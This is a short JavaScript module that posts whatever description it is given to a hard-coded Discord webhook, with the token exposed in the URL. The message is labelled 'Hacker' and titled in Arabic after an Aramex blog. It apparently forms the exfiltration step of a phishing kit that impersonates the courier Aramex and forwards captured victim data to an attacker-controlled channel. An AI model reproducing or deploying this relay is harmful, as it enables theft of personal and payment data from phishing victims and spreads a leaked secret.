import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327287335800541285/_zl4m3DZ3RsupV13ynA_qF292zgEhgI9DBU768L9NqcXpbpM3eMk0be5F1OSQS7ix8iB",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
